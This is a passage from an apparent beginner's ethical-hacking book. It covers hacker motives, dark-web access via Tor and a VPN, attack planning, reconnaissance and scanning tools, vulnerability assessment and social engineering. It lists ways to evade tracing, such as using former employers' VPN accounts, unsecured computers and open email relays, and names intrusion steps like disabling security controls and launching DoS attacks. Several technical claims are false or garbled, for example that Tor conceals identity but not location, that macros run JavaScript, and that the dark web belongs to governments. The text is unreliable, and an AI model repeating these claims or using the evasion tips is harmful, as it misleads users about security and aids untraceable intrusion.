Majority of the hackers normally say that they do not intend to cause any form of harm or gain through some of the bad deeds they take part in. Most of the hackers never look for a tangible payoff. They just want to prove a point, and that feeling is substantial to most of the hackers. For starters, the self-esteem of most of them is boosted in some of these instances. When a person manages to hack different networks simultaneously, they may become addicted, and they will want to hack into other computer networks. Some hackers also want to ensure that the lives of other people have become miserable. They may also want to become famous as a result of some of their acts. Some of the motives that hackers may have include curiosity, revenge, vandalism, challenges, stealing for financial gain, blackmail, sabotage, extortion, and corporate espionage.

Most of the hackers usually cite some of these motives when explaining why they have hacked into a certain network. Some of these motivations are cited regularly especially when the economic conditions are not favorable. Some of the hackers who have managed to gain access to the network may be looking for valuable pieces of information they can use to solicit some money that could help them to solve some of their financial problems. They also compete sometimes. Additionally, hackers may also be trying to exert revenge on other people for different reasons or they may just be trying to relieve their boredom while also satisfying their curiosity.

In most instances, people believe that they may not possess important pieces of information that may prove to be of great value to a hacker. Such a mentality is not suitable for it motivates the hackers. They work hard to ensure that they have accessed a specific network. It is also good to note that hackers sometimes engage in such activities because they can. Hackers can also focus on high-profile systems. When a hacker hacks into a certain system, they will manage to fit into different circles made up of hackers with varying skill sets. They also exploit most of the vulnerabilities within a network and always look for everything that they can compromise. If a hacker fails to copy any information after accessing a network, it may be impossible to prove that they have accessed the network.

Although hackers focus more on various vulnerabilities and they may also deface different websites, they also know that such activities may not be good for a person’s business. When a site has been hacked, the management and other people may decide to address the vulnerabilities as well as the threats that are present. Below are some of the reason why the computer network breaches have become easy.

1.  > A huge population of people is using the Internet.

2.  > Computer networks provide some form of anonymity.

3.  > There is a considerable number of hacking tools at the moment.

4.  > There are many wireless networks that ensure hackers can easily hide their digital footprint.

5.  > The current codebase has become complex in some of the databases that have been developed at the moment.

6.  > Most of the children possess knowledge about computers.

7.  > It is unlikely that hackers are investigated after being caught.

Some of the attacks are rarely reported, and when a hacker is caught, they are not prosecuted. When a hacker is caught, they mainly talk about how their services are beneficial to the society. They also go ahead to note that they were looking into some of the present vulnerabilities. Regardless of whether a hacker has been caught or not, what matters to them is that they have gained “fame and glory”. When they are caught by the authorities, the reward system that they normally thrive from is threatened.

When a hacker is not caught, their malicious activities will go unnoticed. At times, it is good to maintain silence for the sake of the shareholders since they may panic when they get a hold of such negative news. The current laws on privacy and security are changing rapidly since a breach notification must be present. The cases of internal breaches are also becoming common, and they help to showcase the reality of what is happening in some of these organizations. When there is an internal breach, the responsible party is forced to resign. At the moment, when a breach takes place, the federal state and international laws and regulations will state that such activities should be reported to the relevant authorities. Whether a breach is internal or external or backup tapes have been lost, it should all be reported since they affect your business in one way or another.

Planning and Performing an Attack

There are different attacking styles used by hackers. Some hackers normally prepare for a large attack in advance. They always gather various bits of information first. The techniques they use to gather information are methodological. It is also difficult to track a hacker who uses such a technique. Other hackers and mostly the script kiddies always act before trying to look into the consequences of their actions. Such a hacker may try to access a specific network without even concealing their identity. It is easy to catch such a hacker since they always proceed without a plan. Malicious users are widely known, and they possess a lot of knowledge about computer networks within organizations. At times, such hackers try to carry out prodding and poking into a network that they are accessing illegally. They also do stupid things sometimes, and a network administrator can also track them down.

Although hackers have formed underground communities, most of the hackers refrain from sharing information with other people. They work independently most of the time.

When hackers are communicating, they normally make use of private message boards, hacker websites, anonymous email addresses, and the Internet Relay Chat (IRC). It is possible to log into one of these sites, and you may learn more about what hackers are doing; these sites are found on the Dark Web.

About the Dark Web and how to Access It Using the Tor Browser

The World Wide Web is quite large. It contains a lot of information and to peruse through all this information, you might take a lot of time. There is the surface web and the dark web/deep web. Some of the common sites include Wikipedia and Google. The dark web belongs to the governments and the corporates who are avoiding public exposure. In the dark web, you can find government reports, medical records, and financial records. Such information cannot be accessed using search engines and it is also protected using powerful firewalls. In the dark web, you will be exposed to various forms of danger.

The Main Reason Why the Dark Web Is Hidden

Some of the pieces of information stored on the dark web are not meant for the public eye; that is why the dark web is hidden. As king as such information is hidden, it is presumably safe. The main issue is that the information is present on the Internet since it is in the form of surface web applications. As for the Dark Web, it is somewhat complicated. Although it is a part of the World Wide Web, it runs on the private servers, and information can only be accessed through specific means. The high anonymity levels come in handy and the authorities cannot easily shut down some of these sites. Since the Dark Web ensures there are high anonymity levels, people have taken advantage of the situation and they are even engaging in the sale of illegal substances such as drugs.

You may have come across the term cybercrime. Also, you may have heard of some cybercriminals who are mainly after money. They collect various forms of data including personal information and credit card information. All these pieces of information can be traded on the dark web. There are also illegal business dealings taking place on the Dark Web. Some of these dealings include the sale of drugs, firearms, and illegal wildlife.

How Do You Access the Dark Web Sites?

Before you express your interest in accessing the dark web, you should understand that there are many illegal things happening on the platform. You may take the necessary precautions; however, it is not easy to stay fully anonymous. Access the platform at your own risk.

*   > Download the Tor Browser and Install It. The Tor browser allows you to gain access to the dark web. The platform was created to ensure that the intelligence information in the United States was safeguarded. Using the browser, you can access onion websites that are situated on the dark web. When using Tor, you can browse anonymously. The browser will also enlighten a user about the different things that can reveal their identity.

![](images/00002.jpg)

*   > Use a Virtual Private Network (VPN). A virtual private network ensures that you can browse through the Internet anonymously. Your current location will be masked and you will be in a supposed location. It is good to note that Tor only masks your identity, but the platform does not mask your location. There are many VPN services and you can use NordVPN or ExpressVPN.

*   > DuckDuckGo. When navigating the dark web, DuckDuckGo is your friend. It is a search engine that helps you to maneuver the dark web easily. You can easily access the dark web index sites through the DuckDuckGo search engine.

*   > Always Sign Up For a Secure Email Address. Some email addresses are secure and also untraceable. You can use these email addresses to register for the .onion websites. Some of the secure email platforms that you may consider include:

*   > TORbox

*   > ProtonMail

*   > Mail2Tor

All the listed options also have .onion domains and you can access them using the TOR browser. The regular browsers cannot work in this case.

About the Dark Web Search Engine

The .onion domains can only be used on the dark web. They are somewhat similar to the normal domains and they cannot be accessed using regular browsers. Some harmless .onion addresses exist. There are many sites on the dark web and you have to put in some effort so that you can find them. You should also note that you may stumble upon some illegal activities on the dark web.

Is It Safe to Play On the Dark Web?

It may be exciting to try and explore the unknown; however, it is good to come to terms with some of the present dangers on the dark web. The bad guys will always be on the lookout to access various pieces of information. The law enforcement officers will also be on the dark web trying to capture some of the individuals engaging in illegal activities.

The Security Guide for Accessing the Dark Web

We have noted that there are many terrifying things taking place on the Dark Web. You may take some necessary precautions so that you can avoid them. To stay safe, utilize the following guidelines:

1.  > Ensure the Tor browser is up-to-date. Use the Tor browser when accessing the .onion domain sites that are present on the Dark Web. Also, your Tor Browser should be updated so that you may be safe while accessing some of these sites.

![](images/00003.jpg)

2.  > Use a reputable VPN. The importance of using a VPN was discussed earlier. The VPN conceals your location whereas the Tor browser helps to hide your identity. The VPN you are using should be reputable. Some examples were also highlighted including the ExpressVPN.

3.  > Do not use macros. The macros normally run scripts including JavaScript. Using macros can open some worms, and the risk level will be high. If you are asked to enable scripts while surfing on the dark web, you should always think twice since you will be exposed to different forms of malware.

4.  > Be careful with what you download. The main agenda is to avoid malware and viruses. Some hackers attach some malicious codes on different files, and people cannot easily know until it is too late. You may use a virtual machine so that you may stay safe.

5.  > Always change your mindset. There are many people who may assume that the dark web is safe since the cybersecurity experts may be working on ensuring that the Internet is free from cybercrime. Always change your mindset since the dark web is not safe. You should be cautious and must not trust anyone that you meet on the platform.

Some people are faint-hearted. They may opt to act as tourists on the dark web. If you have ever visited the dark web, you will realize that most of the information about the platform is true and no rumors. There are many illegal activities taking place on the platform, and that is why you should ensure that you are safe. You should also be cautious since some of the people on the dark web will always try to take advantage of some of the ignorant individuals. Hackers like the dark web since they can easily discuss anything on the platform. They make use of message board and social media sites that have .onion domains.

Most of the malicious users take advantage of some people’s ignorance. They also know more about some of the aspects of the real-world security. Hackers usually take different approaches as follows:

1.  > Most of the computer networks are not properly managed; some computer systems are not patched properly, monitored, or hardened. The attackers can easily gain access to such a network even though a firewall may be present as well as an access control system. The actions of some malicious users may not be tracked in any way. Additionally, they may have full access to the network and that means they can exploit it to their benefit.

2.  > Most of the security and network administrators may be unable to keep up with some of the attack methods and new vulnerabilities within the system. In some instances, the network administrators may be occupied to an extent that they cannot keep track of every activity on the network. Additionally, they may fail to notice some unusual activity on the network since they may have failed to set goals and their time management skills may also be poor.

3.  > Information systems become more complex with time. At times, the network and security administrators may be unable to keep track of everything happening on the network since the information systems become complex with time. An attacker will always use such information to their advantage. They will always attack during a period when the network and security administrator is unaware.

4.  > The attacks are usually carried out slowly and they cannot be easily detected.

5.  > The attacks may also be carried out after business hours and that means that the network and security administrator may not be present to keep track of the activities taking place within the network.

To learn more about how hackers penetrate these networks, you may keep track of the magazines that talk about hacking and they may also be produced at least once or twice a month.

Most of the hackers learn from their mistakes. When they make a mistake, they always know they are one step closer to gaining access to a certain network. They always use the knowledge they have gained to plan future attacks. As an ethical hacker, you will also have to learn from your mistakes.

Managing Anonymity

Smart hackers want to ensure that their identity is concealed. A hacker always prioritizes more on covering their tracks. The success of a hacker is dependent on whether they have remained unnoticed. They should also not raise any form of suspicion so that they can also go ahead to access the system as they wish in the future. Some of the resources that hackers use to remain anonymous include:

1.  > VPN accounts that may be owned by previous employers or friends

2.  > Public computers in malls, schools, or even libraries

3.  > Internet proxies

4.  > Open wireless networks

5.  > Anonymous e-mail accounts

6.  > Unsecured computers

7.  > Open e-mail relays

If a hacker develops a well-crafted plan, they cannot be easily traced.

> Chapter 3: Coming Up With a Hacking Plan

This chapter will focus on the following areas:

> ➢  Coming up with ethical hacking goals

> ➢  Selecting the networks to test

> ➢  Examining some of the hacking tools

As a hacker, you must come up with a plan before you commence on the hacking process. The plan will ensure that you have penetrated the network at ease and gives you confidence about what you are doing. Since there is a lot of seriousness when carrying out hacking, it is good to come up with a well-crafted plan. You may start by testing a program on your computer while outlining, documenting, and defining your goals. Make sure that you have determined your testing standards while also familiarizing and gathering different tools that will help you to facilitate the entire hacking process. In this chapter, you will get a step-by-step guide on how you can create a good hacking environment that can enhance your success levels when hacking into a network. As an ethical hacker, an approval from your clients and the management should be received before you implement the hacking plan that you had formulated.

Establishing Your Goals

As a hacker, your goals should be outlined accordingly. The main goals that you may have as an ethical hacker entail looking into the vulnerabilities that are present within a network since the main focus is in ensuring that it has become more secure. Some of the steps that help you to outline your goals include:

1.  > Define some of the specific goals. Align all your goals with the business objectives within the organization. Look into what the management is trying to get at the end of the entire process.

2.  > Come up with a schedule that will start and end at a specific moment. The hacking timeline should also be outlined in the form of specific times and dates.

It may take some time to establish all of your goals; nevertheless, it will all be worth it. The goals will offer some guidance. If you have any concerns, you should always refer to all of the goals that you have formulated so that you may stay on track.

How to Determine the Specific System to Hack

You may have numerous computer networks, but you cannot assess all of them at the same time. Ensure that the hacking project has been broken down into bits so that the entire process may be easily manageable. You can decide the specific systems that you want to test based on the analysis that you have carried out. Some of the questions that you should answer in the process include:

1.  > Which are the most critical systems? There are some systems which when accessed without the necessary authorization will cause some trouble and you may also incur great losses.

2.  > Which systems look like they can be easily hacked?

3.  > Which systems have not been documented accordingly?

After formulating all of your goals, you can now decide the specific system that you want to test. The main reason why the formulation of goals is important is that they help you to outline your expectations and you can also make a better estimate of the time and resources that you will use during the entire process. Some of the devices that you may need to test include:

![](images/00004.jpg)

1.  > Routers and switches - a switch connects computers on one network whereas routers connect numerous networks together.

2.  > Firewalls

3.  > Web, applications, and database servers

4.  > Wireless access points and bridges

5.  > E-mail and files

6.  > Workstations, tablets, and laptops

7.  > Mobile devices used to store confidential pieces of information

8.  > Client and server operating systems

When you are dealing with a small network, it is possible to test everything. Some of the public facing hosts should be tested, and they include the web servers and emails. It is also good to that the ethical hacking process is also flexible. Always start with the networks that seem vulnerable. Also, consider the following factors:

1.  > The specific operating system used to run the network

2.  > The applications present in the network

3.  > The specific amount of critical information that has been stored on the network

Attack Tree Analysis

The attack tree analysis is the process whereby a hacker creates a flow chart that outlines how they will attack a certain network. The attack tree analysis is normally used by security teams when they are performing a high-level risk analysis. In most cases, such an analysis is carried out when planning out a new network project. If you want to improve your hacking skills, you should have planned each of your attacks methodologically.

The main issue is the amount of time needed to draw the attack trees. Also, a lot of expertise is needed in such a case. Nowadays, it is also possible to use a computer to come up with the attack tree. Some of the tools that you may use include the SecurITree. An example of the attack tree analysis is as shown below.

![](images/00005.jpg)

Ethical hacking is more detailed as compared to vulnerability assessments. As an ethical hacker, you are supposed to look for a lot of information about different systems. For instance, you should look for information about the organization and its network. Since ethical hacking is flexible; you can utilize different hacking techniques. If you are undecided on where to start, you should assess a system that has great visibility. You may also focus more on the firewall of the specific network.

Formulating Testing Standards

When there is miscommunication, the system can easily crash when carrying out ethical hacking tests. To avoid coming across such challenges, you should come up with document testing standards. The standards should include:

1.  > Specific tests that are being performed

2.  > When are the tests being performed as well as the overall test time

3.  > The amount of knowledge that you possess about a specific system

4.  > How each of the tests will be performed and the IP address that will be used

5.  > The best step to take after discovering different vulnerabilities

Some of the suitable practices when carrying out ethical hacking include:

Timing

It is all about the timing. The timing concept applies to activities such as ethical hacking. When carrying out some tests, you should ensure that the business processes within an organization are not affected. Harmful situations that should be avoided include miscommunication. It is also good to avoid causing a Dos attack on an e-commerce site that has high traffic, especially during the day. If many people are working on a specific project, they should agree on the timing so that they may achieve their end goal.

At times, it is good to always notify the ISP (Internet Service Providers). After they are aware that you are going to test the system to look for some vulnerabilities, they will not block any of your traffic in case they have suspected any malicious behavior that normally appears on the firewall.

The testing timeline should comprise of some short-term dates when carrying out different tests. The milestones should also be outlined. You can come up with a timeline and key in the data into a spreadsheet so that it may offer some suitable form of guidance.

Specific Tests

You may be tasked with carrying out a penetration test. Also, you may want to perform some specific tests including cracking passwords and trying to gain access to different web applications. At times, people also carry out social engineering tests while assessing the network. Regardless of the specific test, you may not want to reveal some information about the specifics of the test. The main reason why documenting is important is that it helps to get rid of any form of miscommunication that may arise in the future. Sometimes, people also make use of screen actions. You may not possess any knowledge about the general tests that you are supposed to perform; however, if you use automated tools, it may be impossible to learn more about the tests that you have conducted.

Blind Versus Knowledge Assessments

It is good to possess huge amounts of knowledge about the system that you are supposed to test. Although such knowledge may not be necessary, you should at least possess a basic understanding of the system so that you are supposed to hack for you to easily protect yourself by making sure that you have not left any digital footprints that can be traced back to you. It is not hard to gain access to such information; you just have to survey so that you may gain a better understanding of the system that you are supposed to access. When you carry out some background research, you will not be hacking into the system blindly. When carrying out an assessment, the techniques that you use are always dependent on your needs.

The most suitable approach is to plan on carrying out unlimited attacks. A hacker with a malicious motive does not hack into a system when using a limited scope. It is also good to confirm whether you want to carry out the tests and that they should not be detected by the network administrators as well as the security providers. You must also carry out physical security tests and social engineering. If there are too many people who know that you are about to test the system, they may change their habits, and the results of the test will not be accurate. However, that does not mean that you should not inform anyone. You should have a main contact within the organization and that they should have an authoritative position.

Location

The tests that you are carrying out dictate the location that you should run them from. The main goal is for the network to be tested from a location that can be easily accessed by malicious hackers. You can also determine whether the network will be hacked by someone within the organization; as a result, it is good to ensure that all the bases have been covered. You may combine different tests and you can execute them both internally and externally.

Some of the tests that you can carry out include cracking passwords and assessing the network infrastructure. At times, seeking the services of an outsider who may possess knowledge about how to hack into a network is advisable for they can perform tests on gadgets such as firewalls, routers, and different web applications. As for the external attacks, you should have a stable Internet connection. In some instances, you may also have to make use of an external proxy server. You can also assign a suitable IP address to your computer that cannot be traced back to you. To get a better view of the network, you should have it plugged into the network outside the firewall. Internal tests are quite easy since you only need to have some physical access to the network and the organization’s servers. You can also use a DLS line or a cable modem.

How to React to the Vulnerabilities Present in the Network

When it comes to vulnerabilities, you need to come up with a sensible technique that you could use to seal the security loopholes that are present within the organization. You should not necessarily hack into the system forever since it will end up crashing in the process. You need to follow the path that you have outlined until you can no longer access the network. If you have any doubts, you should have outlined your goals and should stop after making sure that each of your goals has been achieved. If you discover a certain loophole, you should contact the right people so that they can fix the problem fast. If you do not fix the problem on time, some people may take advantage of the current loopholes and they can cause some irreversible damage. The employees should also try to ensure that they have not violated their employment agreement.

Silly Assumptions

When you assume things, you may fail to achieve your objectives. Below are some assumptions that people make when they are supposed to hack into a network.

1.  > The networks are available during the testing process.

2.  > You can assume that you have all the necessary testing tools.

3.  > The testing tools that you utilize may minimize the possibility of the network crashing.

4.  > You may know all the risks of each test.

You should have documented all the assumptions that you have.

Selecting Tools to Carry Out Security Assessment

The security assessment tools that you use depend on different factors depending on the tests that you are supposed to run. You can perform some ethical hacking tests using a telephone or a network. When performing a comprehensive test, you must have the necessary tools. If you do not know the specific tools that you should use, you will learn more about some of the tools used when hacking into a network in the preceding chapters. Some of these tools are free or commercial; you can use them accordingly to achieve your goals.

You must know about the applications of all the hacking tools that are at your disposal. Some of these tools are also accompanied by manuals, while some have manuals that are not well-documented, and that can be frustrating. You can go ahead and search for some newsgroups as well as message boards to learn more about how some of these tools operate.

Some of the tools may prove to be hazardous since they may affect the health of your network. You should be careful when using some of these tools. You should have an in-depth understanding of all the available options. You should not use any tools during the testing process if you do not have an in-depth understanding of some of these tools. Some of these precautions ensure that you will not be affected by DoS conditions. Also, you will not lose any data in the process. You may also not understand the importance of some of the open-source tools. If some of the freeware tools prove they are not worth it, you can go ahead and purchase the commercial versions since they may prove to be effective. Some of these tools may be expensive; however, what matters most is their functionality. Always make sure that you have gotten value for your money.

> Chapter 4: Hacking Methodologies

In this chapter, the main focus will be on:

> ➢  Examining some of the successful steps during the hacking process

> ➢  How to obtain information about organizations

> ➢  Scanning a network

> ➢  Looking for loopholes on a network

Before you focus on becoming an ethical hacker, you need to have basic knowledge on how to formulate methods that can work well. Ethical hacking entails penetrating a network and also patching it. Some of the proven techniques can also guide you as you focus on learning more about hacking. When you use a specific methodology, you can easily achieve your goals. Also, you will be able to operate professionally and will gain a lot form your time and efforts.

Setting the Stage for the Testing

In the past, the hacking process was quite manual. Nowadays, people can utilize different tools so that they can accomplish various goals. Some of these tools ensure that you can perform the tests and there will be fewer steps involved during the testing process. Although these tools come in handy, it is also good to learn more about what happens in the background. Ethical hacking can also be likened to the software testing process. You must be able to think logically so that you can easily interact with the system components while also learning more about how they work. You are supposed to gather information in small bits. Also, when you begin testing the network, you will have many goals and tests to run. You will move closer until you can discover all the present security vulnerabilities.

The processes used during the ethical hacking process are somewhat the same as the ones used by malicious hackers. The main difference is the goals and the motivation of the malicious and ethical hackers. Also, each individual attains their goals differently. The main difference also is that the ethical hacker will try to look into the vulnerabilities present in the system and they will also address each of these issues. As for the malicious hackers, they will exploit the present vulnerabilities and they will also access different pieces of information that they will use to their own advantage. Nowadays, attacks by malicious individuals can come from different angles. It is advisable to test each possible point which includes the client networks, partners, and vendors. Other areas that can also be tested include laptops, wireless LANs, and home users.

When you begin to put your skills to the test as an ethical hacker, you should keep track of all the tests that you have been carrying out. Also, keep tabs on the tools that you have been using as well as the results that you have obtained. The information that you record can help you in the following ways:

1.  > Tracking what has worked when carrying out tests previously.

2.  > The information helps to prove that you did not hack the system with malicious motives.

3.  > Correlating the tests with the intrusion detection systems as well as other log files is any questions arise.

4.  > You should also document the final report.

Besides taking some general notes, you can also take screenshots of your results since they may also come in handy. The screenshots can be used at a later period since they prove that certain occurrences took place. Additionally, they also come in handy when you are formulating the financial report. Depending on the specific set of tools that you have used, the screenshots will act as your evidence. Such evidence also comes in handy while trying to showcase that different exploits and vulnerabilities are present in the network.

Your main focus should be on the simulation and gathering of information that may compromise the system. When carrying out the tests, you can carry out a partial attack on one of the computers in the network. In some instances, you can also go ahead and attack the entire network. You are mainly looking for weaknesses that can be exploited by malicious users. The internal system should also be assessed comprehensively. When looking for vulnerabilities, check how each of the systems is interconnected and how some of the private systems are operating. You should have looked into the information that has not been protected from malicious users.

When performing ethical hacking, you may carry out a blind assessment, and you may start with basic pieces of information such as the name of the company. Such an approach ensures that you have started from the ground up and you will also able to gain access to sensible pieces of information that can also be easily accessed by the hacker. The main issue is that such a technique can take longer and you may also fail to notice some of the security vulnerabilities that are present within the network. An ethical hacker should not always worry about making sure that their digital footprints being traced since they are performing each task legitimately. Although such a hacker may be acting legitimately, it is advisable to work stealthily. Some of the techniques that hackers use to conceal each of their actions will also be discussed in detail in the forthcoming chapters. They also make use of different countermeasures.

Seeing What Other People See

You gain access to a lot of information about a company and its computer systems. They can also be easily accessed, and this is done using a technique known as foot printing. Information can also be gathered in the following ways:

1.  > Using a web browser to search for information about a certain organization. Some of the search engines such as Google come in handy in such cases.

2.  > Carrying out network scans, assessing vulnerabilities, and probing open ports so as to determine various pieces of information about the network. If you are accessing the network internally, you can use port scanners including GFI LanGuard so that you can also see what is accessible. Regardless of the probing technique that you use, you should limit the information that you are supposed to gather about a specific organization. The amount of time that you will use also matters. Some of the major factors to consider also include the size of the organization as well as the complexity of the information present within the organization.

Gathering Public Information

The amount of information that you have been gathering about a specific organization as well as their network may be readily available on the Internet. Your main task is to find the present information. Such information ensures that a hacker can easily target specific areas within an organization. They may also focus more on specific individuals such as executives within the company.

Some of the techniques that can be used to gather information about the target organization include:

1.  > Web Search: When you perform a web search about an organization, you can gain access to the following pieces of information:

*   > The names of the employees and their contact information

*   > Some of the relevant company dates

*   > Incorporation filings

*   > SEC filings

*   > Mergers and acquisitions

*   > Press releases about some of the organizational changes, major moves, and new products

*   > Patents and trademarks

*   > Presentations, webcasts, and articles

> Microsoft is ensuring that they have made headway in the search arena. Bing is a search engine, and the company falls second in line. As for many hackers, they prefer using Google. The search engine is free and easily accessible, and most of the hackers know how to use this tool to their won advantage.

When using Google, you can use the following techniques:

*   > Typing the keywords. You can find the relevant pieces of information that is present in millions of pages. It is also possible to access phone numbers, files, and addresses.

*   > Performing an advanced web search. Google has some advanced search options, and you can also find some sites that can also be linked back to the specific company’s website. Such a search will ensure that you have gained access to relevant pieces of information about the vendors, partners, and clients within the target company.

*   > By using switches so that you may dig deeper into the firm’s website.

2.  > Web Crawling: The web crawling utilities include the website copier, HTTrack, and you can also mirror a company by also downloading some of the files that can be accessed publicly. You can also inspect the website while offline. You can dig into the following areas:

*   > The layout and configuration of the website.

*   > The files and directories that may not be easily accessible.

*   > The script source code and the HTML codes and also be easily accessed.

*   > Command fields.

> Some of the comment fields also contain certain pieces of information that may prove to be useful including email addresses and names of the internal IT personnel, developers, software versions, server names, some comments on how the code works, and IP addressing schemes.

3.  > Websites: There are some websites can provide different pieces information about various organizations as well as their employees.

4.  > Mapping the Network: When you map a network, you can go ahead and search some of the public resources and databases, and you can see what people may know about your network. Some of these websites include Whois tools that are readily available on the Internet that can also be used to check some of the domains that are available on the Internet. Such a tool comes in handy when starting a social engineering attack or when scanning a network.

5.  > Google Groups: Google Groups can help to reveal some network information about an organization. Some of the information that is accessible through such a platform is the IP addresses, domain names, and usernames. You can also gain access to other forms of private information, including:

*   > A message board that displays too much information about the current network and computer systems. There are many people who post messages on such platforms but they are not aware that the messages are being shared to the entire world.

*   > Confidential information about the company and it may be posted by the clients and employees.

> After discovering that some confidential information has been shared on some online platforms, you should remove it.

6.  > Privacy Policies: Always check the privacy policies on your website. All your users need to know about the information that is collected when they visit your site. Also, they should know how their information is protected. The privacy policies are normally written by lawyers and they do not go-ahead to look into the information regarding your security infrastructure.

7.  > Scanning Systems: By engaging in active information gathering, you may be able to produce more details about your network and you can also see things from the perspective of a hacker. For example, you can do the following:

*   > Utilize the information that you may have gathered using the Whois searches so that you may also test each of the hostnames and IP addresses that are closely related. The information includes the determination of hostnames, IP addresses, running protocols, available shares, open ports, applications, and running services.

*   > Scan the internal hosts and adhere to the scope of your testing. Some of the outsiders cannot view some of these hosts; nevertheless, you need to test them so that you can see what some of the rogue individuals may be able to access.

> In some instances, the hacker may have already accessed the system, and they can manipulate anything from the inside. To be safe, you should examine the entire system to look for any weaknesses. If you do not believe that your scanning systems are reliable, you can use different systems are run them on the virtual machine software.

8.  > Hosts: During the scanning process, also document some of the hosts that may be accessible within the internal network. Always start by pinging some host names using some of these tools

*   > A basic ping utility that is located within the operating system.

*   > Third-party utilities allow people to ping multiple addresses and they include the SuperScan and NetScanTools Pro. You can also use sites such as what ismyipaddress.com to show you how your gateway IP address appears as you browse on the Internet. The website will allow you to see the IP address that can be seen by outsiders.

9.  > Open Ports: You can scan for the open ports using different tools, including:

*   > Nmap and Superscan can help to scan network ports.

*   > You can use a network analyzer to listen to the network traffic. Some of the tools that you can use include Wireshark and OmniPeek.

> It is easy to carry out a scan internally. You should connect your computer to the network and load different forms of software. You can also carry out scans outside the network, and you should start by assigning a public IP address to your computer before you can plug it into the router. In such an instance, your computer is not connected to the Internet. The connection will work regardless of whether you are connected to the Internet or not.

Also, you need to determine what is running on the open ports. As an ethical hacker, you should gain access to such pieces of information after carrying out the scanning process.

The information that you can access includes:

*   > The protocols being used

*   > The services that are running on the hosts which may include database applications, web servers, and e-mails

*   > The remote access services that are available which may include remote desktop

*   > VPN services

*   > Authentication that required for network shares

Assessing Vulnerabilities

After finding all the security loopholes, you should go ahead and look into some of the vulnerabilities that are present in your network. Before the testing process, you should also perform a manual search. You can conduct some research on the message boards used by hackers, vulnerability databases, and websites.

Some classified sites help to list different vulnerabilities. When looking for some of these vulnerabilities, you will realize that some of these vulnerabilities are somewhat generic. At times, you may also be forced to look into some of the vendor’s sites so that you can learn more about the present vulnerabilities. Some of the sites that can help to showcase different vulnerabilities include [www.sans.org/top20](http://www.sans.org/top20). The site helps to showcase more than 20 vulnerabilities. The list of vulnerabilities is compiled by the SANS organization. 

If you do not see any need of looking into some of the present vulnerabilities in the network, you can go ahead and carry out the penetration testing. Some of the options that you have include:

1.  > Manual Assessment: You will be able to assess some of the potential vulnerabilities by establishing a connection to the ports. Some systems can also be assessed manually including some web applications. If you have a lot of time to spare, you can perform each of these tests manually.

2.  > Automated Assessment: Manual assessments are suitable especially when you want to learn, however, the main issue is that most people do not have time to handle all these manual steps. You can scan for vulnerabilities automatically. There are also many vulnerability assessments tools that you can use and they are available on platforms such as UNIX and Windows. It is also possible to use each of these assessment tools on both wireless and wired networks. When using these tools, you can also come up with a map of the business logic. The software developers can also use some of these tools to test whether their lines of codes have different flaws. The main issue when using these tools is that they only scan individual vulnerabilities.

Nowadays, some tools enable event-correlation, and multiple vulnerabilities can be scanned at a go. Some of the tools that you can use to scan vulnerabilities include QualysGuard Suite. The tools can be used to scan ports while also looking for any present vulnerabilities. Also, there is no need to use a computer if you are using the QualysGuard Suite since the tool is available as a SaaS (Software as a Service). You can always log in to the Qualys website and sign up for an account. You will have to pay a certain amount of money because the tool is meant for commercial purposes. You will then key in the specific IP address that you need to test. It is also possible to install the QualysGuard Suite into your network, and it will then scan all the systems internally. The assessments can then be scheduled and the system will then run the tests while also generating some detailed reports. The report will contain some general information about the scan. The details of the present vulnerabilities will also be listed.

When assessing the vulnerabilities that are present with a network using tools such as the QualysGuard Suite, you must have some follow-up expertise since you cannot solely rely on the results of the scans alone. The vulnerability reports should be validated. You should study the reports comprehensively and test the systems critically.

Penetrating the System

You can identify some of the security loopholes within your network through the following ways:

1.  > Make sure you have obtained enough information about the host and the present data.

2.  > Ensure there is a remote command prompt.

3.  > Start or stop some applications.

4.  > Access different systems.

5.  > Disabling different security controls.

6.  > Capturing screenshots.

7.  > Accessing some sensitive files.

8.  > Sending an email as an administrator.

9.  > Performing some SQL injection attacks.

10.  > Launching a DoS attack.

11.  > Uploading a file to prove your victory.

You can exploit some of the vulnerabilities using the Metasploit framework. Some of these vulnerabilities allow you to penetrate the system completely. You need to decide on whether you want to penetrate your system fully and to make sure that you have proven that some vulnerabilities.

> Chapter 5: Social Engineering

In this chapter, the main focus will be on the following areas:

> ➢  Introducing Social Engineering

> ➢  The aftermath of social engineering

> ➢  Learning more about different social engineering techniques

> ➢  How to protect your organization against social engineering

Social engineering is a technique meant to take advantage of some of the weak links within an organization. The main focus is normally on the security defenses. Social engineering can be likened to “people hacking”. It involves the malicious exploitation of the trusting nature that human beings possess. Hackers make sure that they can obtain some personal information, and they use it for their gain. The main issue with social engineering is that it takes a lot of time, and a person must be skilled since they are also dealing with total strangers. In this chapter, the main focus will be on the consequences of social engineering. We will also look into some of the ways through which you can protect your organization from social engineering attacks.

About Social Engineering

Malicious users normally pose as another person so that they may gain access to some personal information that they cannot access through other means. They can use the information they have accessed to hack into a certain network. The information they have accessed can allow them to steal and delete different files. Malicious users can also go ahead and commit other forms of fraud. Social engineering is also different as compared to different exploits that are carried out physically. Some of the well-known physical exploits include dumpster diving and shoulder surfing.

Different examples of social engineering include:

*   > False support personnel: They normally claim that they have to install some new software versions on the target’s computer. They normally lure the user so that they may download the software. After that, the malicious users can then access the network remotely.

*   > False vendors: They claim that they need to update a specific system and they will ask for the administrator passwords so that they may also gain full access.

*   > Phishing e-mails: Such e-mails are normally sent by some external hackers. They mainly gather different forms of information including IDs and passwords of the target users. The passwords can then be used to access the bank accounts of the targets among other things. At times, the external attackers can carry out cross site scripting. A discussion about web application security will also come about in the forthcoming chapters.

*   > False employees: In most cases, they normally contact the security desk and they can issue different lies. They may say that they have left their keys and they cannot access the computer room. They will then be issued a set of keys and they can go ahead and access the computer room. After that, they can access some sets of electronic and physical information about an organization and the network will then be vulnerable.

At times, social engineers pose as well-knowledgeable employees. For instance, they can act as managers or even executives. They may even go ahead and pose as naïve employees. Some of the roles that they can assume include acting as maintenance individuals and IT consultants. The social engineers also fit into different roles. They always switch into different modes depending on the people that they are dealing with.

Effective information security involves making sure that the organization is not prone to social engineering attacks. To ensure that your organization is not prone to such attacks, you need to keep track of all your users. Some of the measures that can be deployed include making sure that there are firewalls encryption and intrusion detection systems. Organizations can secure their information through the mentioned techniques. If an external attacker manages to get past all these defense systems the network within your organization will be vulnerable.

Social engineering requires great skill, and it is highly dependent on a person’s personality and the knowledge that they possess about the target organization. If social engineering does not occur naturally for you, you should first need to learn more about this art. You can also hire a third party who can help to gather information about the target organization.

